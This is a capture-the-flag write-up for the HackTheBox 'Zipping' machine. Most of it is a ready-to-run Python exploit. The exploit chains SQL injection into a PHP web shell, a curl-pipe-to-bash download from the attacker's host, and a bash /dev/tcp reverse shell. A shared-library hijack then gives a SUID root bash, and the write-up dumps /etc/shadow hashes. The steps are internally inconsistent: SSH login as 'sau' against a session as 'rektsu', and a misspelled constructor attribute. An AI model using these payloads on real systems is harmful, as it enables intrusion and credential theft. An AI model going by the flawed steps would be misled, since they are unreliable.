---
layout: post
title: HTB{Zipping}
author: mr4ndr3w
tags: [write-up, hackthebox, machine, linux]
---
<!--cut-->

* TOC
{:toc}


### USER:

Scan [IP]:

`nmap -sC -sV -A [IP]`

```text
┌──(kali㉿kali)-[~/htb/machines/Zipping]
└─$ nmap -sC -sV -A 10.10.11.229
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-20 05:09 EDT
Nmap scan report for 10.10.11.229
Host is up (0.047s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.30 seconds

```

Exploit:

```text
import requests
import sys
import subprocess
import random

if len(sys.argv) < 2:
    print("Usage: python3 HTB_Zipping_poc.py <listener ip> <listener port>")
    sys.exit(1)

fnb = random.randint(10, 10000)
url = "http://10.10.11.229/"

session = requests.Session()

print("[+] Please run nc in other terminal: rlwrap -cAr nc -nvlp " + f"{sys.argv[2]}")

print("[+] Write php shell /var/lib/mysql/rvsl" + str(fnb) + ".php")

with open('revshell.sh', 'w') as f:
        f.write("#!/bin/bash\n")
        f.write(f"bash -i >& /dev/tcp/{sys.argv[1]}/{sys.argv[2]} 0>&1")
proc = subprocess.Popen(["python3", "-m", "http.server", "8000"])
phpshell = session.get(url + f"shop/index.php?page=product&id=%0A'%3bselect+'<%3fphp+system(\"curl+http%3a//{sys.argv[1]}:8000/revshell.sh|bash\")%3b%3f>'+into+outfile+'/var/lib/mysql/rvsl{fnb}.php'+%231")

print("[+] Get Reverse Shell")

phpshell = session.get(url + f"shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2frvsl{fnb}")

proc.terminate()
```


Connect with ssh `sau` with password: `HereIsYourPassWord1431`.

```text
rektsu@zipping:/home/rektsu$ cat user.txt
cat user.txt
cba514b97fd907b0de6a7e0ff87d46f4
```
### ROOT:


I listed the commands user could run as root.

```text
rektsu@zipping:/home/rektsu$ sudo -l
sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
rektsu@zipping:/home/rektsu$ strings /usr/bin/stock

St0ckM4nager

```

File `libcounter.c`:



```text
#include <unistd.h>

void init (void) __attribute__((constuctor));


void init (void) {
    system("cp /bin/bash /tmp/bash && chmod u+s /tmp/bash");
}
```


```text
gcc -shared -o /home/rektsu/.config/libcounter.so -fPIC libcounter.c
```



```text
rektsu@zipping:~$ gcc -shared -o /home/rektsu/.config/libcounter.so -fPIC libcounter.c
rektsu@zipping:~$ sudo /usr/bin/stock
Enter the password: St0ckM4nager
root@zipping:/home/rektsu# cat /root/root.txt 
d1ecdfe9ed46651b6f594f2732d1459e
root@zipping:/home/rektsu# cat /etc/shadow
root:$y$j9T$IYa44JPNfCWV4rqT1W1Kj/$xiHZCNOyiAOLgnHZ06gdF9jWPNR9ixmhsCwFu0Hgy9/:19548:0:99999:7:::
daemon:*:19284:0:99999:7:::
bin:*:19284:0:99999:7:::
sys:*:19284:0:99999:7:::
sync:*:19284:0:99999:7:::
games:*:19284:0:99999:7:::
man:*:19284:0:99999:7:::
lp:*:19284:0:99999:7:::
mail:*:19284:0:99999:7:::
news:*:19284:0:99999:7:::
uucp:*:19284:0:99999:7:::
proxy:*:19284:0:99999:7:::
www-data:*:19284:0:99999:7:::
backup:*:19284:0:99999:7:::
list:*:19284:0:99999:7:::
irc:*:19284:0:99999:7:::
nobody:*:19284:0:99999:7:::
_apt:!:19284::::::
systemd-network:!:19284::::::
systemd-timesync:!:19284::::::
messagebus:!:19284::::::
systemd-resolve:!:19284::::::
pollinate:!:19284::::::
sshd:!:19284::::::
rektsu:$y$j9T$wWBMg/LAoOoUB448jkabg.$8ivoFrxatQTk89/GmgCMdoByo9a1o.l8GK/Xo8BnwT3:19548:0:99999:7:::
mysql:!:19448::::::
_laurel:!:19576::::::
root@zipping:/home/rektsu# 


```


